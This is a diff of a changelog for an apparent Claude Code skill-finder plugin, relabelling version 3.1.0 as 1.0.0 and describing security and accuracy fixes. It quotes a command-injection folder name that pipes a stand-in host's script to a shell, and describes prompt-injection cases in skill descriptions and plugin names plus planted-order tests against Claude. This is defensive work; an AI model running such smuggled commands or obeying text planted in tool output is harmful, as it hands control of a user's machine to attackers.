@@ -1,11 +1,11 @@
 # Changelog
 
-## 3.1.0
+## 1.0.0
 
-A check-up of 3.0.0 found ten flaws. Six are fixed and tested, one is fixed as far as a terminal can show, one fix helps but missed its bar, and two are open.
+Before launch, a check-up of the build I had published found ten flaws. This changelog calls that build the pre-launch build. Six are fixed and tested, one is fixed as far as a terminal can show, one fix helps but missed its bar, and two are open.
 
 ### Fixed
-- **It counted skills you do not have.** 3.0.0 walked the whole plugin folder, so with 50 skills installed and one plugin list added it reported 107. It now reads Claude Code's own install record and the switched-on list. Skills in a switched-off plugin, or in a plugin list you added but never installed from, are shown apart with the line that gets them. Each skill carries its agent (Claude Code, Codex, Cursor).
+- **It counted skills you do not have.** The pre-launch build walked the whole plugin folder, so with 50 skills installed and one plugin list added it reported 107. It now reads Claude Code's own install record and the switched-on list. Skills in a switched-off plugin, or in a plugin list you added but never installed from, are shown apart with the line that gets them. Each skill carries its agent (Claude Code, Codex, Cursor).
 - **The add line could carry a hidden command.** A folder named `x;curl evil.sh|sh;#` was printed unquoted. Every part is now quoted, and a folder or repository name with unusual characters gets no add line at all.
 - **Text from skills reached the assistant unmarked.** Descriptions are now printed after `says:`, under a notice telling the assistant to treat them as information about the skill. Hidden characters and line breaks are removed. A GitHub skill whose text gives orders to the assistant is left out, and an installed one is flagged. On 6,414 public descriptions the check flagged 2: a poisoned test skill from a security scanner's own test folder (NVIDIA/SkillSpector), and one false alarm.
 - **The short-answer sentence had no off switch.** `/skillselect short off`, `SKILLSELECT_SHORT=0`, and `/skillselect settings` to see the switches.
@@ -16,12 +16,12 @@ A check-up of 3.0.0 found ten flaws. Six are fixed and tested, one is fixed as f
 ### New
 - **Why a skill is listed.** Each one shows the words of your request it shares: `why: shares "landing page, html" with your request`.
 - **Every other installed skill, one line each.** The finder prints them after its top list, so the assistant can catch a fit that shares no word with the request. See below.
-- **The GitHub list got better, and works offline.** On 24 sealed requests 3.1 with a login kept 2.83 picks that do the job per request, against 2.04 for 3.0.0, at the same share (84% and 83%). Offline it kept 2.04 with no call to GitHub. These numbers are from the first judge, Claude Opus. See "Three more judges" below and `evidence/round12`.
-- **A planted order.** Claude Opus did not obey it with either version (0 of 3 runs each). 3.1 warned the person in all 3 runs, and 3.0.0 said nothing. See `evidence/round13`.
+- **The GitHub list got better, and works offline.** On 24 sealed requests 1.0.0 with a login kept 2.83 picks that do the job per request, against 2.04 for the pre-launch build, at the same share (84% and 83%). Offline it kept 2.04 with no call to GitHub. These numbers are from the first judge, Claude Opus. See "Three more judges" below and `evidence/round12`.
+- **A planted order.** Claude Opus did not obey it with either version (0 of 3 runs each). 1.0.0 warned the person in all 3 runs, and the pre-launch build said nothing. See `evidence/round13`.
 - **Look-alike names.** A skill whose name mixes alphabets is left out of the GitHub list. One turned up among 6,414 public descriptions: a planted test case in NVIDIA/SkillSpector's test folder, with an order in its description. Skill files inside test folders are now skipped.
 - **The finder no longer lists itself.**
-- **Three more judges.** Claude Fable 5.2, Sonnet 5.5 and Haiku 5.5 judged the saved picks again. 3.1 with a login keeps more picks that do the job under all four judges (0.50 to 0.84 more per request). Under Fable and Sonnet a lower share of its picks do the job than of 3.0.0's (75% against 80%, 69% against 75%). The 88% of 3.0.0 is 86%, 71% and 95% under the three. See `evidence/round15`.
-- **An unknown option is refused.** In 3.0.0 `--anything on` was read as a search for "on". It now prints the usage text.
+- **Three more judges.** Claude Fable 5.2, Sonnet 5.5 and Haiku 5.5 judged the saved picks again. 1.0.0 with a login keeps more picks that do the job under all four judges (0.50 to 0.84 more per request). Under Fable and Sonnet a lower share of its picks do the job than of the pre-launch build's (75% against 80%, 69% against 75%). The 88% of the pre-launch build is 86%, 71% and 95% under the three. See `evidence/round15`.
+- **An unknown option is refused.** In the pre-launch build `--anything on` was read as a search for "on". It now prints the usage text.
 
 ### Found by a code review before release
 - **A plugin's name could carry text to the assistant.** The name in a plugin's `plugin.json` was printed as written, also for a plugin list you had only added. A name with a line break put a line of its own into the answer. Only plain names are printed now.
@@ -36,10 +36,10 @@ A check-up of 3.0.0 found ten flaws. Six are fixed and tested, one is fixed as f
 - **A mistyped `--for` name wrote add lines for Claude Code.** The finder refuses it, and `--help` prints the usage text.
 
 ### Missed its bar, kept because it still helps
-- **Reading every installed skill.** The bar, set before the run, was 16 of 19 fits found on the sealed requests. It found 15 (3.0.0: 14). A second rule, set before the three other judges ran, asked whether it still finds more fits under them. It found 15 against 14 under Fable and Sonnet and 14 against 14 under Haiku, so it is always on. See `evidence/round11` and `evidence/round15`.
+- **Reading every installed skill.** The bar, set before the run, was 16 of 19 fits found on the sealed requests. It found 15 (the pre-launch build: 14). A second rule, set before the three other judges ran, asked whether it still finds more fits under them. It found 15 against 14 under Fable and Sonnet and 14 against 14 under Haiku, so it is always on. See `evidence/round11` and `evidence/round15`.
 
 ### Built and taken out
-- **A hint on every message.** It named installed skills that fit before you asked. In a terminal test it named 9 skills on 36 requests and 8 were fits. It never ran in a live session and it would have run on every message for everyone, so it is not in 3.1.
+- **A hint on every message.** It named installed skills that fit before you asked. In a terminal test it named 9 skills on 36 requests and 8 were fits. It never ran in a live session and it would have run on every message for everyone, so it is not in 1.0.0.
 
 ### Not fixed
 - **It does not start by itself.** Asked in plain words, Claude does not always start the finder.
